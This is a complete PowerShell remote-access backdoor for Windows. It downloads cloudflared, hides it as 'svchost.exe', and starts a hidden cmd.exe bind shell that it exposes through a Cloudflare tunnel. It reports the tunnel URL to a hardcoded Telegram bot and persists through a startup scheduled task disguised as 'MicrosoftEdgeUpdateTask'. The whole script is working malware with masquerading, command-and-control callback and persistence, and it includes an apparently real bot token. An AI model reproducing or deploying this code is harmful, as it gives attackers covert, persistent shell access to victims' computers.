# ========== CONFIGURATION ==========
$BIN_HIDDEN_NAME = "svchost.exe"
$CONFIG_DIR = "$env:USERPROFILE\.config\dbus"
$TMPDIR = "$env:TEMP\.cf-$env:USERNAME"
$PORT = Get-Random -Minimum 10000 -Maximum 50000
$TELEGRAM_BOT_TOKEN = "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
$TELEGRAM_CHAT_ID = "6223261018"

function Send-Telegram {
    param([string]$Message)
    if ($TELEGRAM_BOT_TOKEN -and $TELEGRAM_BOT_TOKEN -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" -and $TELEGRAM_CHAT_ID) {
        $body = @{ chat_id = $TELEGRAM_CHAT_ID; text = $Message; parse_mode = "HTML" }
        try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue } catch {}
    }
}

function Get-Architecture {
    if ([Environment]::Is64BitOperatingSystem) { "windows-amd64" } else { "windows-386" }
}

function Download-Cloudflared {
    param([string]$Arch)
    $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-$Arch.exe"
    $out = "$TMPDIR\cloudflared.exe"
    try { Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop; return $out } catch { return $null }
}

function Start-BindShell {
    param([int]$Port)
    $scriptBlock = {
        param($port)
        $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Loopback, $port)
        $listener.Start()
        while ($true) {
            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo.FileName = "cmd.exe"
            $process.StartInfo.UseShellExecute = $false
            $process.StartInfo.RedirectStandardInput = $true
            $process.StartInfo.RedirectStandardOutput = $true
            $process.StartInfo.RedirectStandardError = $true
            $process.StartInfo.CreateNoWindow = $true
            $process.Start() | Out-Null
            $process.StandardInput.WriteLine("cd %userprofile%")
            $process.StandardInput.AutoFlush = $true
            $process.BeginOutputReadLine()
            $process.BeginErrorReadLine()
            $process.OutputDataReceived += { param($sender, $e) if ($e.Data) { $writer.WriteLine($e.Data); $writer.Flush() } }
            $process.ErrorDataReceived += { param($sender, $e) if ($e.Data) { $writer.WriteLine($e.Data); $writer.Flush() } }
            while ($client.Connected) {
                if ($stream.DataAvailable) {
                    $line = $reader.ReadLine()
                    if ($line -eq $null) { break }
                    $process.StandardInput.WriteLine($line)
                    $process.StandardInput.Flush()
                }
                Start-Sleep -Milliseconds 100
            }
            $process.Close(); $client.Close()
        }
        $listener.Stop()
    }
    $ps = Start-Process -FilePath powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$scriptBlock`" -port $Port" -WindowStyle Hidden -PassThru
    return $ps.Id
}

function Start-Tunnel {
    param([string]$BinPath, [int]$Port)
    $logFile = "$TMPDIR\cloudflared.log"
    $arguments = "tunnel --url tcp://127.0.0.1:$Port"
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $BinPath
    $psi.Arguments = $arguments
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    $process = [System.Diagnostics.Process]::Start($psi)
    $process.OutputDataReceived += {
        param($sender, $e)
        if ($e.Data) {
            Add-Content -Path $logFile -Value $e.Data
            if ($e.Data -match 'https://([a-z0-9-]+)\.trycloudflare\.com') {
                $url = $matches[0]
                $urlSentFile = "$TMPDIR\url_sent.txt"
                if (-not (Test-Path $urlSentFile) -or (Select-String -Path $urlSentFile -Pattern $url -SimpleMatch -Quiet) -eq $false) {
                    Add-Content -Path $urlSentFile -Value $url
                    $msg = "<b>New Tunnel URL</b>`n$url`n`nUse: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
                    Send-Telegram $msg
                }
            }
        }
    }
    $process.BeginOutputReadLine()
    $process.BeginErrorReadLine()
    return $process.Id
}

function Create-Persistence {
    param([string]$ScriptPath)
    $taskName = "MicrosoftEdgeUpdateTask"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
}

function Remove-Persistence {
    $taskName = "MicrosoftEdgeUpdateTask"
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
}

function Uninstall {
    $tokenFile = "$CONFIG_DIR\.uninstall_token"
    if (-not (Test-Path $tokenFile)) { Write-Host "No installation found or token missing."; exit 1 }
    $storedToken = Get-Content $tokenFile -Raw
    $envToken = $env:CF_UNINSTALL
    if (-not $envToken -or $envToken -ne $storedToken) { Write-Host "Invalid uninstall token."; exit 1 }
    $confFile = "$CONFIG_DIR\tunnel.conf"
    if (Test-Path $confFile) {
        $conf = Get-Content $confFile | ConvertFrom-StringData
        if ($conf.BIND_PID) { Stop-Process -Id $conf.BIND_PID -Force -ErrorAction SilentlyContinue }
        if ($conf.TUNNEL_PID) { Stop-Process -Id $conf.TUNNEL_PID -Force -ErrorAction SilentlyContinue }
    }
    Remove-Persistence
    Remove-Item -Recurse -Force $CONFIG_DIR -ErrorAction SilentlyContinue
    Remove-Item -Recurse -Force $TMPDIR -ErrorAction SilentlyContinue
    Write-Host "Uninstall complete."; exit 0
}

# ========== MAIN ==========
if ($env:CF_UNINSTALL) { Uninstall }
if (Test-Path "$CONFIG_DIR\.uninstall_token") { Write-Host "Already installed. Uninstall first."; exit 1 }
Remove-Item -Recurse -Force $TMPDIR -ErrorAction SilentlyContinue; New-Item -ItemType Directory -Path $TMPDIR -Force | Out-Null
Write-Host "Downloading binaries..."
$arch = Get-Architecture
$cfBin = Download-Cloudflared -Arch $arch
if (-not $cfBin) { Write-Host "Failed to download cloudflared"; exit 1 }
$installDir = "$CONFIG_DIR"; New-Item -ItemType Directory -Path $installDir -Force | Out-Null
$destBin = "$installDir\$BIN_HIDDEN_NAME"; Copy-Item -Path $cfBin -Destination $destBin -Force
& $destBin --version | Out-Null
if ($LASTEXITCODE -ne 0) { Write-Host "Binary test failed"; exit 1 }
$uninstallToken = -join ((48..57) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
$uninstallToken | Out-File -FilePath "$installDir\.uninstall_token" -Encoding ascii
Write-Host "To uninstall, set `$env:CF_UNINSTALL=$uninstallToken and run script again."
Write-Host "Starting bind shell on port $PORT..."
$bindPid = Start-BindShell -Port $PORT
Write-Host "Starting tunnel..."
$tunnelPid = Start-Tunnel -BinPath $destBin -Port $PORT
@"
BIND_PID=$bindPid
TUNNEL_PID=$tunnelPid
PORT=$PORT
"@ | Out-File -FilePath "$installDir\tunnel.conf" -Encoding ascii
Start-Sleep -Seconds 5
$logFile = "$TMPDIR\cloudflared.log"
if (Test-Path $logFile) {
    $logContent = Get-Content $logFile -Raw
    if ($logContent -match 'https://([a-z0-9-]+)\.trycloudflare\.com') {
        $url = $matches[0]
        Write-Host "✅ TUNNEL URL: $url" -ForegroundColor Green
        Write-Host "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
        Send-Telegram "<b>Initial Tunnel URL</b>`n$url"
    } else { Write-Host "Tunnel URL not detected yet." -ForegroundColor Yellow }
}
$persistenceScript = $MyInvocation.MyCommand.Path
if (-not $persistenceScript) {
    $persistenceScript = "$installDir\win.ps1"
    Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $persistenceScript -Force
}
Create-Persistence -ScriptPath $persistenceScript
Write-Host "Persistence installed (scheduled task)."
Write-Host "Done. Use CF_UNINSTALL=$uninstallToken to uninstall."
